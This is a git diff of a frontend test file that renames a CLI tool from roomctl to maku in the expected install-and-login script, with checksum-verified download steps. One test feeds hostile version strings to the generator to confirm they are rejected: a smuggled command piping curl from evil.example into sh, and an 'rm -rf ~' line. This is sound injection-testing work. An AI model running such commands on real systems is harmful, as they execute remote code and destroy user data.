@@ -127,30 +127,30 @@ describe("cliSetup", () => {
     const blocks = [...d.querySelectorAll("pre")].map((p) => p.textContent!);
     return { get, text: blocks.length ? blocks.join("\n") : d.querySelector(".cli-card")!.textContent! };
   };
-  it("installs the broker's roomctl release, checksum verified, then configures and logs in (#48)", async () => {
+  it("installs the broker's maku release, checksum verified, then configures and logs in (#48)", async () => {
     const { get, text } = await open({ ...values, version: "v0.7.0" });
     expect(text).toBe([
       `os=$(uname -s | tr A-Z a-z); arch=$(uname -m); case $arch in x86_64) arch=amd64;; aarch64) arch=arm64;; esac`,
-      `base=https://github.com/Smana/agent-platform/releases/download/v0.7.0`,
-      `curl -fsSLO "$base/roomctl-$os-$arch" && curl -fsSLO "$base/roomctl.sha256"`,
+      `base=https://github.com/Smana/maku/releases/download/v0.7.0`,
+      `curl -fsSLO "$base/maku-$os-$arch" && curl -fsSLO "$base/maku.sha256"`,
       `command -v sha256sum >/dev/null && sum=sha256sum || sum="shasum -a 256"`,
-      `grep " roomctl-$os-$arch$" roomctl.sha256 | $sum -c - && sudo install -m 0755 "roomctl-$os-$arch" /usr/local/bin/roomctl`,
-      "roomctl configure \\",
+      `grep " maku-$os-$arch$" maku.sha256 | $sum -c - && sudo install -m 0755 "maku-$os-$arch" /usr/local/bin/maku`,
+      "maku configure \\",
       "  --url https://rooms.priv.example \\",
       "  --issuer https://auth.example \\",
       "  --client-id 3434@agents \\",
       "  --project-id 29184",
-      "roomctl login",
+      "maku login",
     ].join("\n"));
     expect(get).toHaveBeenCalledWith("/api/roomctl", expect.anything());
   });
   it("installs the latest release when the version is not a whole release semver, hostile ones included", async () => {
     for (const version of ["dev", undefined, `v1"; curl https://evil.example | sh #`, "v1.2.3\nrm -rf ~"]) {
       const { text } = await open({ ...values, version });
-      expect(text).toContain("base=https://github.com/Smana/agent-platform/releases/latest/download\n");
+      expect(text).toContain("base=https://github.com/Smana/maku/releases/latest/download\n");
     }
   });
-  it("says so when this broker has no roomctl client", async () => {
+  it("says so when this broker has no maku client", async () => {
     const { text } = await open({ url: "https://rooms.priv.example", issuer: "https://auth.example", clientID: "" });
     expect(text).toContain("not set up");
   });
